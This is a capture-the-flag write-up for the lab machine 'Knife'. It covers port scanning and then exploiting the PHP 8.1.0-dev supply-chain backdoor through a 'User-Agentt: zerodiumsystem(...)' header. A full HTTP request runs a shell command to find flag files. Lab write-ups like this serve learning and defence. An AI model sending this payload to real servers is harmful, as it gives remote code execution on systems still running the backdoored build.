### Knife - Explore and nmapping

Starting with nmap to see what's runnng on the server:
```bat
sudo nmap -p- --min-rate 10000 -oA knife -v 10.10.10.242
```


While the nmap is running we can take a look and see if any website is running on the default port.
![website](https://is-going-to-rick-roll.me/1637881484.png)
So the website is a static page with one page (landing page)
no forms or anything special/suspicious.

Now let's check the nmap results
![nmap result](https://is-going-to-rick-roll.me/1637881600.png)
as we can see we have two ports open:
* 22 - TCP SSH
* 80 - TCP HTTP

sicne we have two options I'll go and investigate the website.
Opening burp suite and sniffing the GET for the index page returns us nothing special
![burp results](https://is-going-to-rick-roll.me/1637881755.png)
At first glance, it might look like a normal website nothing exciting.
But (as a PHP fanboy) i saw something that is really rememberable.
the X-Powerd-By line shows us that it runs PHP 8.1.0 DEVELOPMENT VERSION (which includes a backdoor)

(You can read more about this vulnerability that was released and approved for a few hours in the main repo at: https://rioasmara.com/2021/10/23/supply-chain-attack-php-8-1-0-dev-backdoor/)

After reading a bit more about this vulnerability I can understand how to run RCE.




### Using the vulnerabilities we found


So, after we found RCE in the website we cna be sure that this is the main vulnerability that will get give us the credentials we need for the SSH connection and etc.

By replacing the "User-Agent" name with "User-Agentt" we baypass the backdoor check and now we'll be able to execute code, by giving the value zerodium followed by the command we want to run.
For testing we'll try to echo "kekw".
![RCE POC](https://is-going-to-rick-roll.me/1637882393.png)
as you can see in the screenshot from Burp Suite the RCE worked and we managed to execute code.




## First Flag, owning user.
Most of the time people save flags in txt files, so because it was 1:25 AM at the time i did the first thing that came up to my mine.

```xml
GET /index.php HTTP/1.1

Host: 10.10.10.242

User-Agentt: zerodiumsystem('find . -name *.txt');

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Connection: close

Upgrade-Insecure-Requests: 1
```

response: ![](https://is-going-to-rick-roll.me/1637882832.png)
<br>

and here we go, inside the first file it returned we have the user flag.
we can use the RCE in order to print it (:

![back-door in PHP](https://is-going-to-rick-roll.me/1637882978.png)